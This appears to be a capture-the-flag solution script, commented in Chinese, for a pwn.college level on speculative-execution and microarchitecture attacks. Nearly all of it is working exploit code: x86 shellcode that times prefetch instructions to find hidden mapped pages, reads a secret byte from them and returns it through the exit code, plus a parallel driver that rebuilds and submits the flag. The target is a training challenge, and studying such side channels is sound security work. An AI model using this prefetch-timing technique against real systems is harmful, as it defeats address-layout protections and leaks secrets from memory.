# Microarchitecture Exploitation - Prefetch Peek
# https://pwn.college/system-security/speculative-execution/level7-1

import concurrent.futures

import pwn
from dojotool import find_challenge, submit


def leak_byte(binary: str, pos: int, threshold: int) -> int:
    shellcode = rf"""
        /* 将上界加载到寄存器中 */
        mov r9, 0x10000000000

        /* 从 0x10000 开始扫描，步长 0x10000 */
        mov rdi, 0x10000

        /* 测量访问 rdi 地址的延迟，结果放在 rax */
    .measure_page:
        lfence
        rdtsc
        mov rsi, rax
        sal rdx, 32
        or  rsi, rdx
        lfence
        rdtsc
        /* rcx 上记录了空访问的耗时 */
        mov rcx, rax
        sal rdx, 32
        or  rcx, rdx
        lfence
        rdtsc
        mov r8, rax
        sal rdx, 32
        or  r8, rdx
        prefetcht2 [rdi]
        prefetcht2 [rdi]
        prefetcht2 [rdi]
        prefetcht2 [rdi]
        prefetcht2 [rdi]
        prefetcht2 [rdi]
        prefetcht2 [rdi]
        prefetcht2 [rdi]
        prefetcht2 [rdi]
        prefetcht2 [rdi]
        prefetcht2 [rdi]
        prefetcht2 [rdi]
        prefetcht2 [rdi]
        prefetcht2 [rdi]
        prefetcht2 [rdi]
        prefetcht2 [rdi]
        prefetcht2 [rdi]
        prefetcht2 [rdi]
        prefetcht2 [rdi]
        prefetcht2 [rdi]
        prefetcht2 [rdi]
        prefetcht2 [rdi]
        prefetcht2 [rdi]
        prefetcht2 [rdi]
        prefetcht2 [rdi]
        lfence
        rdtsc
        sub eax, r8d
        sub rcx, rsi
        sub eax, ecx

        /* 如果 T1 >= 阈值，说明未映射，直接跳过 */
        cmp rax, {threshold}
        jae .next

        /* 是已映射页。尝试读取一字节匹配 'p' */
        movzx rax, byte ptr [rdi]
        cmp rax, 0x70
        jne .next

        /* 匹配成功，用 syscall exit 返回第 {pos} 索引位置的字节 */
        movzx rdi, byte ptr [rdi + {pos}]
        mov rax, 60
        syscall

    .next:
        add rdi, 0x10000
        cmp rdi, r9
        jb .measure_page
    .fail:
        mov rdi, 0x00
        mov rax, 60
        syscall
    """
    with pwn.process(binary, raw=True, level="error") as io:
        io.sendafter(b"from stdin.", pwn.asm(shellcode))
        return (io.poll(True) or 0) & 0xFF


def one_round(binary: str) -> None:
    threshold = 64
    concurrency = 4

    flag = bytearray()

    for pos in range(64):
        attempt = 0  # 单 pos 内累计尝试计数，用于日志

        executor = concurrent.futures.ProcessPoolExecutor(max_workers=concurrency)
        in_flight: set[concurrent.futures.Future] = {
            executor.submit(leak_byte, binary, pos, threshold) for _ in range(concurrency)
        }

        try:
            # 每个失败结果立刻补位，直到第一个可打印字节出现。
            while True:
                done, _ = concurrent.futures.wait(
                    in_flight, return_when=concurrent.futures.FIRST_COMPLETED
                )
                for fut in done:
                    in_flight.discard(fut)
                    r = fut.result()
                    printable = 0x20 < r < 0x7F
                    marker = "✓" if printable else "✗"
                    attempt += 1

                    if printable:
                        print(
                            f"[{pos:2d}] #{attempt:04d} {marker} 0x{r:02x} '{chr(r)}'", flush=True
                        )
                        leaked = r
                        break

                    # 失败任务离开集合后，立即由新任务补位。
                    in_flight.add(executor.submit(leak_byte, binary, pos, threshold))
                else:
                    continue

                break
        finally:
            for process in executor._processes.values():
                process.terminate()
            executor.shutdown(wait=False, cancel_futures=True)

        flag.append(leaked)
        if leaked == ord("}"):
            break

    flag = flag.decode()
    print("FLAG:", flag)
    submit(flag)


def ctf() -> None:
    root_bin = find_challenge()
    one_round(root_bin)


if __name__ == "__main__":
    ctf()
